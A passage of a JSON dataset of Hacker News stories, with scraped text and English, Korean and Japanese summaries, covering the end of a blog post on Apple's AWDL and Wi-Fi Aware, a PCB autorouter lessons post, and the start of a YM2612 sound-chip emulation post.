(Wi-Fi Aware | Android Open Source Project)[5] Nordic Semiconductor – Bluetooth Range Compared – Bluetooth 5 LE offers up to ~400 m range (4× vs BLE4), 2 Mbps PHY, ~1.36 Mbps application throughput. (Things You Should Know About Bluetooth Range)[6] Computerworld – Coming soon: Faster, longer-range Bluetooth 5 – “In clear line of sight, Bluetooth 5 range could stretch to 400 meters,” (2016)[7] BGR -- iOS 19 Features Coming to EU -- Details new features for EU iPhones including high-bandwidth P2P Wi-Fi, sideloading, and alternative app stores (March 2025) (8 Exclusive iOS 19 Features Coming to EU iPhone Users)[8] Open Wireless Link Wiki - What is Apple Wireless Direct Link (AWDL) -- Apple’s patent on AWDL (US201800838) and origins as a successor to Wi-FI IBSS (Wiki | Open Wireless Link)[9] CyberHoot – Apple Wireless Direct Link (AWDL) – Apple deployed AWDL in over billion devices to power AirDrop, AirPlay peer Connections, and more (2002) (Apple Wireless Direct Link (AWDL) - CyberHoot)[10] Wi-Fi Alliance – Wifi Aware – Android added platform support for Wi-Fi Aware in Oreo (8.0) and later (Wi-Fi Aware | Wi-Fi Alliance)[11] Usenix Association – A billion Open Interfaces for Eve and Mallory: MitM, DoS, and Tracking ATtacks on iOS and macOS Through Apple Wireless Direct Link – AWDL integrates with Bluetooth Low Energy (A Billion Open Interfaces for Eve and Mallory: MitM, DoS ... - USENIX)[12] Octet Stream – Building Cross Platform Offline - First Apps with Bluetooth Low Energy - Integration with Bluetooth Low Energy (May 2024) (Building Cross-Platform Offline-First Apps with Bluetooth Low Energy).[13] Open Wireless Link – Code – Linux Implementation called OWL (Code | Open Wireless Link)[14] Secure Mobile Networking Lab (SEEMOO) -- Apple Wireless Direct Link (AWDL) and Secure Device Communications – AWDL is a based ad-hoc protocol with Apple-specific extensions integrated into Apple’s ecosystem (Matthias Hollick – Secure Mobile Networking Lab)[15] WiFi Alliance – Wi-Fi CERTIFIED Wi-Fi Aware Technology Overview – Wi-Fi Aware always-on background discovery with power efficiency (2002) (Wi-Fi CERTIFIED Wi-Fi Aware™ Technology Overview (2022) | Wi-Fi Alliance)[16] WiF Alliance – Wi-Fi Aware Specification v4.0 – Detailed Specification for Wi-Fi Aware technology (2022) (Wi-Fi Aware Specification v4.0.pdf‍SUBSCRIBEGet posts straight in your inboxSubscribe to updates and we'll send you occasional emails with posts that we think you'll like.\n  hbspt.forms.create({\n    portalId: \"4836182\",\n    formId: \"b8668664-695d-40ab-a974-db7a6522dbea\",\n    region: \"na1\"\n  });\nEmail*utm_sourceutm_mediumutm_campaignutm_termutm_content\n\nRead moreView All ArticlesView All ArticlesView All ArticlesProductMarch 19, 2025Introducing Ditto 4.10: More Power, More Control, and New Platform SupportbySkyler JokielOur latest Ditto 4.10 SDK release brings significant improvements, giving developers more flexibility, better performance, and support for new platforms. March 12, 2025Ditto Lands $82M to Pioneer the Edge-Native RevolutionbyRyan RatnerThe future of computing isn’t in the cloud - it’s at the edge. And with this latest funding round, we’re poised to make Ditto the new standard for edge development.\n\nul.footer_links_wrap>li.footer_links_item { transition: opacity 400ms ease, transform 400ms ease; }\nul.footer_links_wrap:has(li.footer_links_item:hover)>li.footer_links_item:not(:hover) { opacity: 0.5; }\nul.footer_links_wrap:has(li.footer_links_item:hover)>li.footer_links_item:hover { transform: translateX(0.5em); }\nResilient Edge Device ConnectivityServers and Cloud, OptionalStart for freeStart for freeStart for freeSchedule a DemoSchedule a DemoSchedule a Demo© 2025 DittoLive IncorporatedAll rights reserved.CompanyPlatformAbout UsOur CustomersPricingCareersResourcesBlogDEMOAPPSIn The NewsPress ReleasesMake a ReportSocialsLinkedinGithubTwitter / XLegalTerms of ServicePrivacy PolicyCookie PolicyDPA",
    "summary": {
      "en": "The European Union (EU) is mandating that Apple replace its proprietary peer-to-peer Wi-Fi protocol, Apple Wireless Direct Link (AWDL), with the open standard Wi-Fi Aware, also known as Neighbor Awareness Networking (NAN). This change is part of the EU's Digital Markets Act (DMA), which aims to improve interoperability between devices. Apple must implement Wi-Fi Aware 4.0 in its upcoming iOS 19 update and support Wi-Fi Aware 5.0 shortly thereafter.\n\nHistorically, AWDL provided Apple devices with fast, high-performance peer-to-peer communication, enabling features like AirDrop and AirPlay. However, it was limited to Apple products and did not allow cross-platform connectivity. Wi-Fi Aware, on the other hand, is an open standard that enables devices from different manufacturers to discover and connect to each other directly via Wi-Fi, enhancing compatibility between iPhones and Android devices.\n\nThe key benefits of Wi-Fi Aware include efficient discovery, high data throughput, low latency, and enhanced security features. This shift will allow developers to create applications that work seamlessly across both Apple and Android platforms without the need for complex workarounds.\n\nIn summary, the EU's regulations are pushing Apple to adopt a standard that will facilitate better interoperability, allowing devices from different brands to connect easily and paving the way for innovative applications in local networking.",
      "ko": "유럽연합(EU)은 애플이 자사의 독점적인 피어 투 피어 Wi-Fi 프로토콜인 애플 무선 다이렉트 링크(AWDL)를 개방형 표준인 Wi-Fi Aware, 즉 이웃 인식 네트워킹(NAN)으로 교체하도록 요구하고 있습니다. 이 변화는 EU의 디지털 시장법(DMA)의 일환으로, 기기 간의 상호 운용성을 개선하는 것을 목표로 하고 있습니다. 애플은 다가오는 iOS 19 업데이트에서 Wi-Fi Aware 4.0을 구현하고, 그 이후에는 Wi-Fi Aware 5.0을 지원해야 합니다.\n\nAWDL은 역사적으로 애플 기기 간에 빠르고 고성능의 피어 투 피어 통신을 제공하여 에어드롭과 에어플레이와 같은 기능을 가능하게 했습니다. 그러나 AWDL은 애플 제품에만 국한되어 있어 다른 플랫폼 간의 연결이 불가능했습니다. 반면, Wi-Fi Aware는 다양한 제조사의 기기가 서로를 직접 발견하고 연결할 수 있도록 하는 개방형 표준으로, 아이폰과 안드로이드 기기 간의 호환성을 높입니다.\n\nWi-Fi Aware의 주요 장점은 효율적인 발견, 높은 데이터 전송 속도, 낮은 지연 시간, 그리고 강화된 보안 기능입니다. 이러한 변화는 개발자들이 애플과 안드로이드 플랫폼 모두에서 복잡한 우회 방법 없이 원활하게 작동하는 애플리케이션을 만들 수 있도록 할 것입니다.\n\n결론적으로, EU의 규제는 애플이 상호 운용성을 개선할 수 있는 표준을 채택하도록 압박하고 있으며, 이는 다양한 브랜드의 기기가 쉽게 연결될 수 있도록 하고, 지역 네트워킹에서 혁신적인 애플리케이션의 길을 열어줄 것입니다.",
      "ja": "欧州連合（EU）は、Appleに対して独自のピアツーピアWi-FiプロトコルであるApple Wireless Direct Link（AWDL）を、オープンスタンダードのWi-Fi Aware、別名Neighbor Awareness Networking（NAN）に置き換えるよう義務付けています。この変更は、EUのデジタル市場法（DMA）の一環であり、デバイス間の相互運用性を向上させることを目的としています。Appleは、今後のiOS 19のアップデートでWi-Fi Aware 4.0を実装し、その後すぐにWi-Fi Aware 5.0をサポートする必要があります。\n\nAWDLは、Appleデバイスに高速で高性能なピアツーピア通信を提供し、AirDropやAirPlayなどの機能を可能にしてきました。しかし、AWDLはApple製品に限定されており、異なるプラットフォーム間の接続はできませんでした。一方、Wi-Fi Awareはオープンスタンダードであり、異なるメーカーのデバイスがWi-Fiを介して直接発見し接続できるようにし、iPhoneとAndroidデバイス間の互換性を向上させます。\n\nWi-Fi Awareの主な利点には、効率的な発見、高速なデータ転送、低遅延、強化されたセキュリティ機能があります。この移行により、開発者はAppleとAndroidの両方のプラットフォームでシームレスに動作するアプリケーションを作成できるようになり、複雑な回避策を必要としなくなります。\n\n要するに、EUの規制はAppleに対して、異なるブランドのデバイスが簡単に接続できる標準を採用するよう促しており、ローカルネットワークにおける革新的なアプリケーションの道を開いています。"
    }
  },
  {
    "id": "dbb1005d9315d56d",
    "title": {
      "en": "\"Station\" by Mitsuo Isaka (1994)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://twitter.com/gingerbeardman/status/1906041957668770237",
    "score": 13,
    "by": "tosh",
    "time": 1743277979,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "10097a15cc5088c4",
    "title": {
      "en": "Things I would have told myself before building an autorouter",
      "ko": "오토라우터 제작 전 꼭 할 말",
      "ja": "オートルーターの前に自分に伝えたかったこと"
    },
    "type": "story",
    "url": "https://blog.autorouting.com/p/13-things-i-would-have-told-myself",
    "score": 382,
    "by": "seveibar",
    "time": 1743122333,
    "content": "Share this postautorouting13 things I would have told myself before building an autorouterCopy linkFacebookEmailNotesMoreDiscover more from autoroutingReviews, benchmarks and open datasets for autorouting, with a focus on open-source autorouting.SubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign in13 things I would have told myself before building an autorouterImportant lessons from trying to build the world's fastest autorouter for about a yearSeveMar 28, 202512Share this postautorouting13 things I would have told myself before building an autorouterCopy linkFacebookEmailNotesMore42ShareI’ve spent about a year working on an autorouter for tscircuit (an open-source electronics CAD kernel written in Typescript). If I could go back a year, these are the 13 things I would tell myself:An intermediate stage of our autorouting routing a keyboard.1. Know A* like the back of your hand, use it everywhereIf I was king for a day, I would rename A* to “Fundamental Algorithm”. It is truly one of the most adaptable and important algorithms for _any kind_ of search. It is simply the best foundation for any kind of informed search (not just for 2d grids!)Here’s an animated version of A* versus “breadth first search” on a 2d grid:The way A* explores nodes is a lot faster and more intuitive. The major difference between these two algorithms is BFS explores all adjacent nodes, while A* prioritizes exploring nodes that are closer to the destination. Because it considers a metric outside the graph (the distance to the destination) it’s an informed search.You are already either using BFS or DFS (depth-first search) in your code. A recursive algorithm is a depth first search. Any loop that explores candidates/neighbors without sorting the candidates is a BFS. 99% of the time you can convert it to A* and get dramatic performance gains!One of my favorite techniques in our autorouter is we run multiple levels of A* to discover the optimal hyperparameters for a particular problem. So we’re basically running each autorouter as a candidate, then using A* to determine which autorouters we should spend the most time on!See all those numbers at the top? Those are each different configurations of hyper parameters. Running each autorouter fairly would be a huge waste of time- if one autorouter starts to win (it is successfully routing with good costs) allocate more iterations to it! This kind of meta-A* combines a regular cost function that penalizes distance with a cost function that penalizes iterations.2. Implementation Language doesn’t matterI’m controversially writing our autorouter in Javascript. This is the first thing people call out, but it’s not as unreasonable as you might expect. Consider that when optimizing an algorithm, you’re basically looking at improving two things:Lowering the number of iterations required (make the algorithm smart)Increasing the speed of each iterationPeople focus way too much on improving the speed of each iteration. If you are doing something dumb (like converting everything to a grid for overlap testing), Javascript performance will beat you no matter what language you use!Dumb algorithms in optimal assembly are slower than smart algorithms in Javascript! Algorithm > Language!95% of your focus should be on reducing the number of iterations. This is why language doesn’t matter. Whatever gets you to the smartest, most cacheable algorithm fastest is the best language.3. Spatial Hash Indexing > Tree Data StructuresYou can’t walk 5 feet into multi-dimensional space optimization without someone mentioning a QuadTree, this incredible data structure that makes O(N) search O(log(N)) when searching for nearby objects in 2d/3d space.The QuadTree and every general-purpose tree data structure are insanely slow. Trees are not an informed representation of your data.Any time you’re using a tree you’re ignoring an  O(~1) hash algorithm for a more complicated O(log(N)) algorithmWhy does Javascript use HashSets and HashMaps by default and every chance it gets? They’re super super fast. A Spatial Hash Index is the same concept as a HashMap, but instead of hashing the object we hash it’s location and store it in a Cell (or “bucket of things that are close together”)Let’s look at how we might replace the QuadTree with a SpatialHashIndex with 20% as much code:There are many variants of this basic data structure for different types of objects, but they all look pretty similar. We’re basically just creating “buckets” with spatial hashes and filling them with any object that is contained within the cell represented by the spatial hash.The reason spatial hashes aren’t as popular is you need to be careful about selecting your cell size- this is what makes it an informed algorithm. If your cell size isn’t calibrated well, you’ll end up paying high fixed costs per retrieval. In practice, it’s not that difficult to pick a reasonable cell size.4. Effective Spatial Partitioning + Caching is 1000x more important than algorithm performanceA circuit board like the one inside an IPhone probably has somewhere between 10,000 and 20,000 traces and take a team several months to route with the best EDA tools in world. It can seem daunting to try to optimize such an incredibly complex task- but the truth is the entire industry is neglecting a very simple idea: everything that has been routed has been routed before.Game developers “pre-bake” navigation meshes into many gigabytes for their games. LLMs compress the entire internet into weights for search. The next generation of autorouters will spatially partition their problems, then call upon a massive cache for pre-solved solutions. The speed of the algorithm doesn’t matter when you have a massive cache with 99% of the autorouting problem pre-solved.Most algorithms today do not focus on the effective cache-reusability or effective spatial partitioning, but a critical component of future autorouters will be caching inputs and outputs from each stage in a spatially partitioned way.Moreover, the size of storage and caching seems to go down faster than the speed of computation goes up. It’s not a big deal to have a gigabyte cache to make your autorouter 50% faster.At the end of the day, the cache will win. Cacheable algorithms matter more than fast algorithms!5. If you do not have a visualization for a problem, you will never solve itIf there is one thing I could have printed on a poster, it would be VISUALIZE THE PROBLEM. You can’t debug problems by staring at numbers.For every tiny problem we solve, we have a visualization. We will often start with the visualization. Time and time again this enables us to debug and solve problems 10x faster than we could otherwise. Here’s a visualization we made of a subalgorithm for finding 45 degree paths, we use this in our “Path Simplification Phase”, an ~final phase of the autorouter.6. Javascript Profiling Is Amazing- Use it!Javascript profiling tools are incredibe, you can easily see the exact total time in ms spend on each line of code. You don’t need to use any performance framework, just execute your javascript in the browser and pull up the performance tab. There are also awesome features like flame charts and stuff for memory usage.Example flamechat for debugging performance in @tscircuit/coreYou can easily see the time spent on each line of code inside Chrome’s performance tools!Here’s a little youtube short I made about it7. Never use recursive functionsRecursive functions are bad for multiple reasons:They are almost always synchronous (can’t be broken out for animation)They are inherently a Depth-First Search, and can’t be easily morphed to A*You can’t easily track iterationsMutability is often unnatural in recursive functions but critical to performanceHere’s an example of an “obviously recursive” function converted to a non-recursive function:The iteration-based implementation is much faster because it keeps a set of visitedNodes and checks nodes prior to exploration. You can do this with recursive functions, but you have to pass around a mutable object and do other unnatural things. It’s just best to avoid recursive functions when writing performant code.8. Monte Carlo algorithms are hacks. AVOIDMonte Carlo algorithms use randomness to iterate towards a solution. They are bad because:They lead to non-deterministic, hard-to-debug algorithmsThey are basically never optimal relative to a heuristicI sometimes use Monte Carlo-style algorithms when I don’t yet know how the algorithm should get to the solution, but I know how to score a candidate. They can help give some basic intuition about how to solve a problem. Once you have something approximating a cost function, do something smarter than Monte Carlo or any other random technique like Simulated Annealing. If your algorithm is sensitive to local minimums, consider using hyper parameters or more complex cost functions. Almost any local minimum your human eye can see can be made into a component of a cost function.Another way to think about it: How many PCB Designers randomly draw lines on their circuit board? None. Nobody does that. It’s just not a good technique for this domain. You’ll always be able to find a better heuristic.9. Keep intermediate algorithms groundedOur autorouter is currently a pipeline with 13 stages and something like 20 sub-algorithms that we measure the iteration count of for various things like determining spatial partitions or simplifying paths at the boundaries independently autorouted sections.Being able to overlay different inputs/output visualizations of each stage of the algorithm helps you understand the context surrounding the problem you’re solving. I often ran into issues at downstream stages (often our “high density routing” stage) that could be solved by improving the output of previous stages.The temptation when building sub-algorithms is to isolate the algorithm to its simplest form, maybe even normalizing around (0, 0). The danger with normalization or any complex transformation is it might impact the ability to quickly see consequences from early stages of the algorithm to later stages of the algorithm. To prevent this, just keep your coordinate space consistent throughout the lifecycle of the algorithm.Here’s each stage of our algorithm one after another. We often zoom in on this to see what stage is the most guilty culprit for a failed Design Rule Check.10. Animate your iterations to catch stupid behaviorRemember how it’s super important to lower your iteration count?Animating the iterations of your algorithm will show you how “dumb” it’s being by giving you an intuition for how many iterations are wasted exploring paths that don’t matter. This is particularly helpful when adjusting the greedy multiplier (discussed in 12)This video is an animation of a simple trace failing to solve, but instead of failing outright attempting to solve endlessly outward. Without the animation, it would have been hard to tell what was going on!11. Intersection math is fast, do you really need a grid?Consider two ways to determine if a trace A overlaps another trace B:Consider each segment of A and B, and check for intersections1Create a binary grid that marks each square where trace B is present, then check all the squares where trace A is present to see if B is thereBelieve it or not, most people would choose to use Option 2 with a binary grid check, even though this can easily be 1000x slower. People do this because math is hard 🤦Luckily LLMs make this kind of intersection math trivial. Use fast vector math!! Checking a SINGLE grid square (memory access!) can literally be slower than doing a dot product to determine if two segments intersect!12. Measure spatial probability of failure at each stage, prioritize solvabilityWhen doing spatial partitioning of the problem, you can measure the probability of solve failure of each stage with some leading indicators. For example, in the Unravel Autorouter we track the probability of failure for each “Capacity Node” at each major pipeline stage. Each stage focuses on reconfiguring adjacent nodes or rerouting to reduce the probability of failure.The great thing about probability of failure as a metric is you can literally measure it and improve your prediction as your algorithm changes. Each stage can then do it’s best to minimize the chance of future stages failing.I think generally prioritizing solvability is better than trying to incorporate too many constraints. Once a board is solved, it’s often easier to “work with that solution” than to generate optimal solution from scratch.13. The “Greedy Multiplier”, the secret hack to 100x A* performance at the cost of optimality Ok it’s not exactly a secret, maybe a “well-known secret”, but if you don’t know about it, you’re not using A* properly.By default, A* is guaranteed to give you the optimal solution, but what if you care more about speed than about optimality? Make one tiny change to your f(n)and you have Weighted A*, a variant of A* that solves more greedily, and generally much, much faster!Normal A*: f(n) = g(n) + h(n)Weighted A*: f(n) = g(n) + w * h(n)You can read more about weighted A* and other A* variants here.Game developers have a lot of the same problems as autorouting developers, so it’s not a bad idea to look for game development papers if you’re searching for related work!We’re making an autorouter.If this was interesting to you, I’d love to show you our autorouter as it gets closer to release. I believe that solving autorouting will be a massive unlock for physical-world innovation and is a key piece to enable the “vibe-building” of electronics. All of our work is MIT-licensed open-source. You can also follow me on twitter.Thanks for reading autorouting! Subscribe to hear when we release our insanely fast autorouter!Subscribe1Technically, you should use “segment to segment” distance to ensure appropriate margins, which is slightly more complex than intersection, but not by much12Share this postautorouting13 things I would have told myself before building an autorouterCopy linkFacebookEmailNotesMore42Share",
    "summary": {
      "en": "The author shares 13 key lessons learned from a year spent building an autorouter for open-source electronics design, focusing on improving efficiency and performance. Here’s a simplified summary:\n\n1. **Master A* Algorithm**: It’s essential to understand the A* algorithm, as it’s more efficient than others like Breadth-First Search (BFS) for searching paths.\n\n2. **Don't Worry About Programming Language**: The choice of language (like JavaScript) is less important than using smart algorithms to reduce iterations.\n\n3. **Use Spatial Hash Indexing**: Instead of tree structures like QuadTrees, use spatial hash indexing for faster searches in multidimensional spaces.\n\n4. **Prioritize Caching**: Effective caching of data is more important than the speed of algorithms. Pre-solving problems can significantly enhance performance.\n\n5. **Visualize Problems**: Creating visual representations of problems helps in understanding and solving them more effectively.\n\n6. **Utilize JavaScript Profiling Tools**: These tools help track performance issues in your code easily.\n\n7. **Avoid Recursive Functions**: They can complicate performance and debugging, so use iterative approaches instead.\n\n8. **Be Cautious with Monte Carlo Algorithms**: These introduce randomness and can lead to non-optimal solutions; seek smarter methods instead.\n\n9. **Keep Algorithms Grounded**: Maintain consistent data representation across different stages of your algorithm to avoid confusion.\n\n10. **Animate Algorithm Iterations**: Animation helps identify inefficiencies in the algorithm by showing how it behaves in real-time.\n\n11. **Use Fast Intersection Math**: Instead of relying on slow grid checks, use mathematical calculations to determine overlaps quickly.\n\n12. **Measure Failure Probability**: Track the likelihood of failure at each stage to improve the algorithm’s predictability and success.\n\n13. **Use Weighted A* for Speed**: Adjust the A* algorithm to prioritize speed over optimality by tweaking its cost function.\n\nThese insights aim to help others avoid common pitfalls and streamline the development of an efficient autorouting system.",
      "ko": "저자는 오픈 소스 전자 설계를 위한 자동 라우터를 개발하며 배운 13가지 주요 교훈을 공유합니다. 이 교훈들은 효율성과 성능 향상에 중점을 두고 있습니다.\n\n첫째, A* 알고리즘을 마스터하는 것이 중요합니다. A* 알고리즘은 경로 탐색에서 너비 우선 탐색(BFS)보다 더 효율적입니다. 둘째, 프로그래밍 언어에 대해 걱정할 필요는 없습니다. 자바스크립트와 같은 언어의 선택보다 스마트한 알고리즘을 사용해 반복 횟수를 줄이는 것이 더 중요합니다.\n\n셋째, 공간 해시 인덱싱을 활용하세요. QuadTree와 같은 트리 구조 대신, 다차원 공간에서 더 빠른 검색을 위해 공간 해시 인덱싱을 사용하는 것이 좋습니다. 넷째, 데이터 캐싱을 우선시해야 합니다. 알고리즘의 속도보다 효과적인 데이터 캐싱이 더 중요하며, 문제를 미리 해결하는 것이 성능을 크게 향상시킬 수 있습니다.\n\n다섯째, 문제를 시각화하세요. 문제의 시각적 표현을 만들면 이해하고 해결하는 데 도움이 됩니다. 여섯째, 자바스크립트 프로파일링 도구를 활용하세요. 이러한 도구는 코드의 성능 문제를 쉽게 추적할 수 있게 해줍니다.\n\n일곱째, 재귀 함수는 피하세요. 재귀 함수는 성능과 디버깅을 복잡하게 만들 수 있으므로 반복적인 접근 방식을 사용하는 것이 좋습니다. 여덟째, 몬테카를로 알고리즘에 주의해야 합니다. 이 알고리즘은 무작위성을 도입하여 비최적의 솔루션으로 이어질 수 있으므로 더 스마트한 방법을 찾아야 합니다.\n\n아홉째, 알고리즘의 일관성을 유지하세요. 알고리즘의 다양한 단계에서 데이터 표현을 일관되게 유지하면 혼란을 피할 수 있습니다. 열째, 알고리즘 반복 과정을 애니메이션으로 표현하세요. 애니메이션은 알고리즘의 비효율성을 실시간으로 보여줍니다.\n\n열한째, 빠른 교차 수학을 사용하세요. 느린 그리드 체크에 의존하기보다는 수학적 계산을 통해 겹침을 빠르게 판단하는 것이 좋습니다. 열두째, 실패 확률을 측정하세요. 각 단계에서 실패 가능성을 추적하면 알고리즘의 예측 가능성과 성공률을 높일 수 있습니다.\n\n마지막으로, 속도를 위해 가중치 A* 알고리즘을 사용하세요. A* 알고리즘의 비용 함수를 조정하여 최적성보다 속도를 우선시할 수 있습니다. 이러한 통찰력은 다른 사람들이 일반적인 함정을 피하고 효율적인 자동 라우팅 시스템 개발을 간소화하는 데 도움을 주기 위해 제시되었습니다.",
      "ja": "著者は、オープンソースの電子設計用オートルーターを構築するために費やした1年から得た13の重要な教訓を共有しています。効率とパフォーマンスの向上に焦点を当てた内容です。\n\nまず、A*アルゴリズムをマスターすることが重要です。このアルゴリズムは、経路探索において幅優先探索（BFS）などの他の手法よりも効率的です。プログラミング言語の選択（例えばJavaScript）は、反復回数を減らすための賢いアルゴリズムを使用することに比べてそれほど重要ではありません。\n\n次に、空間ハッシュインデックスを使用することをお勧めします。四分木のような木構造の代わりに、マルチディメンショナルな空間での検索を高速化するために空間ハッシュインデックスを利用します。データの効果的なキャッシングも重要で、アルゴリズムの速度よりも、事前に問題を解決することがパフォーマンスを大幅に向上させます。\n\n問題を視覚化することも助けになります。問題の視覚的な表現を作成することで、理解と解決がより効果的になります。JavaScriptのプロファイリングツールを活用することで、コード内のパフォーマンスの問題を簡単に追跡できます。\n\n再帰関数はパフォーマンスやデバッグを複雑にする可能性があるため、代わりに反復的なアプローチを使用することが推奨されます。また、モンテカルロアルゴリズムには注意が必要です。これらはランダム性を導入し、最適でない解決策につながることがあるため、より賢い方法を探すべきです。\n\nアルゴリズムの各段階で一貫したデータ表現を維持することで混乱を避けることができます。アルゴリズムの反復をアニメーション化することで、リアルタイムでの挙動を示し、非効率性を特定するのに役立ちます。遅いグリッドチェックに頼るのではなく、数学的な計算を用いて重なりを迅速に判断するための高速な交差計算を使用します。\n\n各段階での失敗の可能性を測定することで、アルゴリズムの予測可能性と成功率を向上させることができます。最後に、A*アルゴリズムをスピードを優先するように調整し、そのコスト関数を変更することで、最適性よりも速度を重視することができます。\n\nこれらの洞察は、他の人が一般的な落とし穴を避け、効率的なオートルーティングシステムの開発をスムーズに進める手助けをすることを目的としています。"
    }
  },
  {
    "id": "2966e8a0c61468ff",
    "title": {
      "en": "Emulating the YM2612: Part 1 – Interface",
      "ko": "YM2612 인터페이스 탐구",
      "ja": "YM2612を再現！第1部 - インターフェース"
    },
    "type": "story",
    "url": "https://jsgroth.dev/blog/posts/emulating-ym2612-part-1/",
    "score": 36,
    "by": "zdw",
    "time": 1742920430,
    "content": "Emulating the YM2612: Part 1 - Interface\n\n        2025.3.24\n\n        2025.3.25\n\n                Emulation\n\n        3301\n\n        16mins\n\n  Contents\n    Primary Source\n    Four-Operator FM Synthesis\n    Clock\n    Interface\n\n        Write Ports\n        Read Port\n        Read Port Mirroring: Discrete YM2612 vs. YM3438\n\n    First Audio Output: DAC Channel\n    To Be Continued\n\n                This is the first post in a series on emulating the main Sega Genesis sound chip, the Yamaha YM2612 FM synthesis chip, also known as the OPN2.\nTo date, the YM2612 is pretty easily the most difficult-to-emulate sound chip that I have worked on. It’s not extremely complex in concept, but it has an incredible amount of specific details and quirks in how exactly it works, and many of them need to be emulated exactly correctly for game audio to sound correct. Debugging mistakes is also very, very difficult due to all of the modulation and feedback, where for example a minor mistake in envelope emulation can manifest as some instruments sounding completely wrong.\nThese posts are not going to describe how to implement a cycle-accurate YM2612 emulator (mine is not), but I will do my best to describe how the chip works at a low level, from the perspective of someone who emulated it for the first time with modern documentation and resources available.\nI found a number of minor bugs and oversights in my own implementation while writing these posts, so if nothing else, writing them was useful for that!\nThis first post will mostly cover how the YM2612 is integrated into the Genesis and how the CPUs interface with it.\nPrimary Source\nFirst, I should state that nearly all of my information on the YM2612 comes from this very long thread plus resources linked from it: https://gendev.spritesmind.net/forum/viewtopic.php?t=386\nIn particular, there’s a lot of great information posted by Nemesis (Exodus author) on how exactly this chip works. I do not believe I would have been able to throw together my own YM2612 implementation without the information in this thread.\nDo be wary that many earlier posts in this thread contain inaccurate information that is corrected in later posts. As one of the more obvious examples, the first post on how the ADSR envelope generators work has some major errors that are corrected many pages later.\nMask of Destiny (BlastEm author) made a post that links to some of the most useful pages in that thread, as well as lots of other generally useful resources for anyone writing a Genesis emulator: https://gendev.spritesmind.net/forum/viewtopic.php?f=2&t=2227\nOne linked source is a translated manual for the YM2608 chip, which is very closely related to the YM2612. This is a particularly useful source, though note that the YM2608 is not exactly the same as the YM2612. I’ll try to note some of the biggest differences where they’re relevant.\nSega’s official Genesis documentation on the YM2612 is almost useless. Lots of major inaccuracies and it omits a lot of important information.\nFour-Operator FM Synthesis\nI attempted to overview how Yamaha FM synthesis works at a very high level in a section of my previous post on Konami’s VRC7 mapper for the Famicom. The YM2612 is similar in concept, though the details are very different from VRC7 and other OPL chips.\nWhile these chips are called “FM” (frequency modulation), the hardware implementation is really phase modulation: some sine wave generators are used to dynamically adjust the phase of other sine wave generators. This is true for both VRC7 and YM2612.\nThe YM2612 has 6 audio channels, each with 4 sine wave generators called operators. Having 4 operators is a very significant change from the 2-operator FM synthesis of OPL2 and OPLL/VRC7, and it enables the chip to produce a much larger variety of sounds.\nA channel’s 4 operators can be arranged in 1 of 8 different configurations, called “algorithms”. The algorithm determines whether any particular operator is a carrier (contributes directly to channel output) or a modulator (phase modulates another operator). Modulators may phase modulate multiple other operators depending on the algorithm, but there is no algorithm that makes any operator both a modulator and a carrier simultaneously.\nEach channel’s operator 1 (counting from 1) is unique in that it supports self-feedback, like the OPLL/VRC7’s modulator. This means that it can optionally phase modulate itself using the sum of its last two operator outputs.\nThe first 4 algorithm options use the first 3 operators as modulators and the 4th operator as a carrier. The second 4 algorithm options each have multiple carriers, with the last algorithm making all 4 operators carriers. For algorithms with multiple carriers, the channel output is the sum of all carrier outputs.\nYM2612/YM2608 algorithms, from the YM2608 manual\nThe chip also includes a number of features beyond the FM synthesis operators themselves: a low frequency oscillator (LFO) used to power vibrato and tremolo effects, two hardware timers for use by software, and a DAC channel that outputs raw 8-bit PCM samples if enabled.\nThe YM2608 manual mentions support for ADPCM sample playback and some “rhythm” functionality, but neither of these features is present in the YM2612.\nTo start, let’s cover how the YM2612 is integrated into the Genesis.\nClock\nThe Genesis drives the YM2612 using the exact same clock signal that it uses to drive the 68000 CPU, a roughly 7.67 MHz clock (NTSC). The exact frequency is 53693175 Hz / 7 for NTSC consoles and 53203424 Hz / 7 for PAL consoles, those 8-digit numbers being the respective Genesis master clock frequencies.\nThe YM2612 internally divides its master clock by 6, leading to an effective clock rate of ~7.67 MHz / 6 = ~1.28 MHz in the NTSC Genesis.\nIn an emulator, the important thing is that the YM2612’s master clock is the 68000 CPU clock, so it should get ticked 1 internal YM2612 cycle per 6 68000 CPU clock cycles. If you’re tracking timings in Genesis master clock cycles, the YM2612 should get 1 internal cycle per 42 mclk cycles.\nThe YM2612 generates a full output sample once every 24 internal clock cycles…kind of. In actual hardware it repeatedly cycles through its 6 channels at a rate of 1 channel per 4 cycles and it multiplexes the channel outputs through its DAC, similar to the Famicom Namco 163 expansion audio chip (though without the audio aliasing caused by that chip’s low cycling rate). Emulators don’t usually emulate this multiplexing - they typically mix the channels instead of multiplexing them, and they generate a mixed sample once every 24 clock cycles.\nThis leads to an effective sample rate of about 53267 Hz for NTSC (53693175 Hz / 7 / 6 / 24) and slightly lower for PAL.\nAlmost everything inside the YM2612 updates at the sample clock rate or at some divider of the sample clock rate, though different components update at different times throughout the 24-cycle sampling period. Emulators do not usually emulate this very precise timing - they usually update all components at once every 24 internal cycles.\nInterface\nThe Genesis has a split bus, with the 68000 CPU on one side and the Z80 CPU on the other. It has a bus arbiter for managing access from one side to the other, as well as for allowing the 68000 to control the Z80 by setting its BUSREQ and RESET lines. BUSREQ removes the Z80 from the bus so that the 68000 can freely access hardware on the Z80 side of the bus.\nThe Z80 can access the 68000 side of the bus at any time, but every access introduces a variable delay for both CPUs as the bus arbiter inserts wait states to avoid a bus conflict.\nThe Z80 is meant to be a dedicated audio processor. To support this, the YM2612 is on the Z80 side of the bus so that the Z80 can access it without needing to cross over to the 68000 side and incur difficult-to-predict delays from the bus arbiter.\n(Interestingly, the SN76489 PSG chip is on the 68000 side of the bus, but SN76489 interactions are generally significantly less timing-sensitive compared to driving the YM2612’s DAC channel.)\nThe 68000 can access the YM2612 through its Z80 memory map window at $A00000-$A0FFFF, as long as it first removes the Z80 from the bus by setting its BUSREQ line using the bus arbiter. Some games primarily drive audio using the 68000, such as Sonic 1 - it only really uses the Z80 for playing samples through the YM2612’s DAC channel. Sonic 1 controls the YM2612 FM synthesis channels and the PSG using the 68000.\nIn fact, Sonic 1 is pretty much fully playable without emulating the Z80 at all! You need to emulate the bus arbiter registers at $A11100 and $A11200, and you won’t get any of the audio samples that it plays through the YM2612’s DAC channel, but you’ll get audio output from the FM synthesis channels and the 